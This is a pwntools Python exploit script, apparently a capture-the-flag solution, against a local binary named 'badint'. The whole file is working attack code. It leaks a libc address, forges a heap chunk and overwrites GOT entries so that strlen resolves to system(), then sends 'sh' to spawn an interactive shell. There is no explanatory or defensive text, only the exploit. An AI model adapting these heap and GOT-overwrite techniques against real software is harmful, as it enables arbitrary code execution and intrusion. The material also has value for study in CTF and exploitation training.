from pwn import *
 
BINARY_PATH = './badint'
p = process(BINARY_PATH)
binary = ELF(BINARY_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
def Add(seq, offset, data,lsf):
    p.sendlineafter('SEQ #: ', str(seq))
    p.sendlineafter('Offset: ',str(offset))
    p.sendlineafter('Data: ',data)
    p.sendlineafter('LSF Yes/No: ',lsf)
 
#libc Leak
Add(0, 8, 'A'*256,'Yes')
 
data = p.recvuntil('0000').split(':')[2].strip()
libcleak = u64(data.decode('hex'))
 
libc.address = libcleak - 0x3c3b78
log.info("libc leak : " + hex(libcleak))
log.info("libc base : " + hex(libc.address))
log.info("System()  : " + hex(libc.symbols['system']))
 
Add(0,0,'A'*0x68*2,'Yes')
Add(0,0,'B'*0x38*2,'Yes')
# Overwrite fake chunk
payload = p64(0x604042).encode('hex')
payload += p64(0x0).encode('hex') * 6
payload += p64(0x51).encode('hex')
log.info("payload : " + str(len(payload)))
payload += '0' * (0x68*2 - len(payload))
 
Add(1, 0x1d0, payload, 'Yes')
 
log.info(".plt fgets : " + str(hex(binary.plt['fgets'])))
log.info(".plt strlen: " + str(hex(binary.plt['strlen'])))
 
# Overwrite the "got.plt" area
payload =  "L"*12
payload += p64(binary.plt['fgets'] + 6).encode('hex')                   # .plt _fgets address
payload += p64(binary.plt['strlen'] + 6).encode('hex')                  # .plt _strlen address
payload += p64(libc.symbols['system']).encode('hex')
payload += "L"*(110 - len(payload))
Add(1,0,payload,'No')
 
p.sendlineafter('SEQ #: ',"sh")
p.interactive()
